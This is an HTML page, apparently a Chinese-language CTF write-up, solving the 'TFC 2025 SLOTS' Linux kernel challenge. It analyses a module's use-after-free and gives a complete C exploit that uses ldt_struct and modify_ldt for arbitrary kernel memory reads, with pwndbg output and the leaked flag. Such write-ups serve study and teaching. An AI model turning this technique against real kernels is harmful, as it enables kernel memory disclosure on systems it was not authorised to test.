@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>TFC 2025 SLOTS</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./TFC 2025 SLOTS.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">TFC 2025 SLOTS</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-08-31]</div>
+    </header>
+    <div class="layout-grid">
+                <main><h2 id="fen-xi">分析</h2><p>模块初始化时将flag读入数据段中并删除文件系统中flag
+提供菜单功能：</p>
+<ul>
+<li>0：指定大小申请堆，标志GFP_KERNEL，可用两次</li>
+<li>1：delete 存在UAF</li>
+<li>2：edit 指定偏移、长度、缓冲区，无溢出</li>
+<li>1337：show 指定偏移、长度、缓冲区，无溢出</li>
+</ul>
+<p>启动脚本，开启<code>fgkaslr</code>增加随机化程度</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">qemu-system-x86_64 \
+</span><span style="color:#c0c5ce;">  -kernel ./bzImage \
+</span><span style="color:#c0c5ce;">  -cpu max \
+</span><span style="color:#c0c5ce;">  -initrd ./initramfs.cpio.gz \
+</span><span style="color:#c0c5ce;">  -nographic \
+</span><span style="color:#c0c5ce;">  -monitor none,server,nowait,nodelay,reconnect=-1 \
+</span><span style="color:#c0c5ce;">  -serial stdio  \
+</span><span style="color:#c0c5ce;">  -display none \
+</span><span style="color:#c0c5ce;">  -m 256M \
+</span><span style="color:#c0c5ce;">  -no-reboot \
+</span><span style="color:#c0c5ce;">  -nographic \
+</span><span style="color:#c0c5ce;">  -append &quot;console=ttyS0 kpti fgkaslr quiet&quot; \
+</span></pre>
+<p>config文件如下，使用SLUB</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">CONFIG_SLUB=y
+</span><span style="color:#c0c5ce;">CONFIG_SLAB_MERGE_DEFAULT=n
+</span><span style="color:#c0c5ce;">CONFIG_SLAB_FREELIST_RANDOM=y
+</span><span style="color:#c0c5ce;">CONFIG_SLAB_FREELIST_HARDENED=y
+</span><span style="color:#c0c5ce;">CONFIG_RANDOM_KMALLOC_CACHES=n
+</span></pre>
+<p>发现内核模块加载地址有概率不变，其中<code>my_ioctl</code>函数地址有概率固定为<code>0xffffffffc0400029</code></p>
+<p>发现规律：可通过获取指令中相对rip的偏移，计算得到此处全局变量<code>chunk</code>的地址，而flag位于全局变量<code>flag_data</code>中，二者偏移固定，从而可以通过这种方式计算得到flag地址</p>
+<p>利用<code>ldt_struct</code>结构体（slub中0x10），两次任意地址读泄露flag</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">pwndbg&gt; x/2i 0xffffffffc0400029
+</span><span style="color:#c0c5ce;">   0xffffffffc0400029:  mov    rdi,QWORD PTR [rip+0xffffffffffee8940]        # 0xffffffffc02e8970
+</span><span style="color:#c0c5ce;">   0xffffffffc0400030:  test   rdi,rdi
+</span><span style="color:#c0c5ce;">pwndbg&gt; x/7bx 0xffffffffc0400029
+</span><span style="color:#c0c5ce;">0xffffffffc0400029:     0x48    0x8b    0x3d    0x40    0x89    0xee    0xff
+</span><span style="color:#c0c5ce;">pwndbg&gt; x/4bx 0xffffffffc0400029+4
+</span><span style="color:#c0c5ce;">0xffffffffc040002d:     0x89    0xee    0xff    0x48
+</span><span style="color:#c0c5ce;">pwndbg&gt; x/4bx 0xffffffffc0400029+3
+</span><span style="color:#c0c5ce;">0xffffffffc040002c:     0x40    0x89    0xee    0xff
+</span><span style="color:#c0c5ce;">pwndbg&gt; p/x 0xffffffffc0400030+0xffffffffffee8940
+</span><span style="color:#c0c5ce;">$1 = 0xffffffffc02e8970
+</span><span style="color:#c0c5ce;">pwndbg&gt; x/s 0xffffffffc02e8970-0x410
+</span><span style="color:#c0c5ce;">0xffffffffc02e8560:     &quot;CTF{fakeflagfakeflagfakeflagfakeflagfakeflagfakeflagfakeflagfakeflagfakeflagfakeflagfakeflagfakeflag&quot;
+</span></pre>
+<h2 id="exp">exp</h2><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdint.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/syscall.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sched.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/socket.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ioctl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">COLOR_GREEN &quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">COLOR_RED &quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[31m</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">COLOR_YELLOW &quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[33m</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">COLOR_DEFAULT &quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">logi</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">fmt</span><span style="color:#c0c5ce;">, ...) </span><span style="color:#8fa1b3;">dprintf</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, COLOR_GREEN &quot;</span><span style="color:#a3be8c;">[+] </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">%d </span><span style="color:#c0c5ce;">&quot; fmt &quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot; COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
+</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">logw</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">fmt</span><span style="color:#c0c5ce;">, ...) </span><span style="color:#8fa1b3;">dprintf</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, COLOR_YELLOW &quot;</span><span style="color:#a3be8c;">[!] </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">%d </span><span style="color:#c0c5ce;">&quot; fmt &quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot; COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
+</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">loge</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">fmt</span><span style="color:#c0c5ce;">, ...) </span><span style="color:#8fa1b3;">dprintf</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, COLOR_RED &quot;</span><span style="color:#a3be8c;">[-] </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">%d </span><span style="color:#c0c5ce;">&quot; fmt &quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot; COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
+</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">fmt</span><span style="color:#c0c5ce;">, ...)                      \
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">do                                     </span><span style="color:#c0c5ce;">\
+</span><span style="color:#c0c5ce;">    {                                      \
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">loge</span><span style="color:#c0c5ce;">(fmt, ##__VA_ARGS__);          \
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">loge</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Exit at line </span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, __LINE__); \
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);                           \
+</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ADD_CMD </span><span style="color:#d08770;">0x0
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DELETE_CMD </span><span style="color:#d08770;">0x1
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">EDIT_CMD </span><span style="color:#d08770;">0x3
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">SHOW_CMD </span><span style="color:#d08770;">0x1337
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">bind_core</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">core</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    cpu_set_t cpu_set;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CPU_ZERO</span><span style="color:#c0c5ce;">(&amp;cpu_set);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CPU_SET</span><span style="color:#c0c5ce;">(core, &amp;cpu_set);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">sched_setaffinity</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">getpid</span><span style="color:#c0c5ce;">(), sizeof(cpu_set), &amp;cpu_set);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">logi</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Process binded to core </span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, core);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">u_int64_t heap_addr = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, kbase_addr = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">typedef struct </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    size_t offset;
+</span><span style="color:#c0c5ce;">    size_t length;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*ptr;
+</span><span style="color:#c0c5ce;">}menu_arg;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, ADD_CMD, &amp;size);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, DELETE_CMD, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(size_t </span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">len</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">content</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    menu_arg tmp =
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">offset </span><span style="color:#c0c5ce;">= offset,
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">length </span><span style="color:#c0c5ce;">= len,
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">ptr </span><span style="color:#c0c5ce;">= content
+</span><span style="color:#c0c5ce;">    };
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, EDIT_CMD, &amp;tmp);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(size_t </span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">len</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">content</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    menu_arg tmp =
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">offset </span><span style="color:#c0c5ce;">= offset,
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">length </span><span style="color:#c0c5ce;">= len,
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">ptr </span><span style="color:#c0c5ce;">= content
+</span><span style="color:#c0c5ce;">    };
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, SHOW_CMD, &amp;tmp);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">user_desc {
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">  entry_number;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">  base_addr;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">  limit;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">  seg_32bit:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">  contents:</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">  read_exec_only:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">  limit_in_pages:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">  seg_not_present:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">  useable:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> __x86_64__
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/*
+</span><span style="color:#65737e;">	 * Because this bit is not present in 32-bit user code, user
+</span><span style="color:#65737e;">	 * programs can pass uninitialized values here.  Therefore, in
+</span><span style="color:#65737e;">	 * any context in which a user_desc comes from a 32-bit program,
+</span><span style="color:#65737e;">	 * the kernel must act as though lm == 0, regardless of the
+</span><span style="color:#65737e;">	 * actual value.
+</span><span style="color:#65737e;">	 */
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;">  lm:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#b48ead;">#endif
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> tmpbuf[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> user_desc desc;
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">bind_core</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/slot_machine</span><span style="color:#c0c5ce;">&quot;, O_RDONLY);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">die</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">opne /dev/slot_machine error</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">     </span><span style="color:#65737e;">/* init descriptor info */
+</span><span style="color:#c0c5ce;">    desc.</span><span style="color:#bf616a;">base_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0xff0000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    desc.</span><span style="color:#bf616a;">entry_number </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x8000 </span><span style="color:#c0c5ce;">/ </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// LDT_ENTRY_SIZE * LDT_ENTRIES
+</span><span style="color:#c0c5ce;">    desc.</span><span style="color:#bf616a;">limit </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    desc.</span><span style="color:#bf616a;">seg_32bit </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    desc.</span><span style="color:#bf616a;">contents </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    desc.</span><span style="color:#bf616a;">limit_in_pages </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    desc.</span><span style="color:#bf616a;">lm </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    desc.</span><span style="color:#bf616a;">read_exec_only </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    desc.</span><span style="color:#bf616a;">seg_not_present </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    desc.</span><span style="color:#bf616a;">useable </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(SYS_modify_ldt, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, &amp;desc, sizeof(desc));
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    size_t target_addr = </span><span style="color:#d08770;">0xffffffffc040002c</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">, &amp;target_addr);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(tmpbuf, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(tmpbuf));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(SYS_modify_ldt, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, &amp;tmpbuf, </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">logi</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">0x</span><span style="color:#d08770;">%x</span><span style="color:#c0c5ce;">&quot;, tmpbuf[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]);
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    size_t offset = tmpbuf[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]+</span><span style="color:#d08770;">0xffffffff00000000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    size_t flag_addr = </span><span style="color:#d08770;">0xffffffffc0400030</span><span style="color:#c0c5ce;">+offset-</span><span style="color:#d08770;">0x410</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">logi</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">offset = 0x</span><span style="color:#d08770;">%llx</span><span style="color:#c0c5ce;">&quot;, offset);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">logi</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">flag_addr = 0x</span><span style="color:#d08770;">%llx</span><span style="color:#c0c5ce;">&quot;, flag_addr);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">, &amp;flag_addr);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(tmpbuf, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(tmpbuf));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(SYS_modify_ldt, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, &amp;tmpbuf, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">logi</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)tmpbuf);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#65737e;">// TFCCTF{very_long_very_caca_flag_so_that_you_have_to_run_exploit_more_than_0ne_time}
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#fen-xi">分析</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
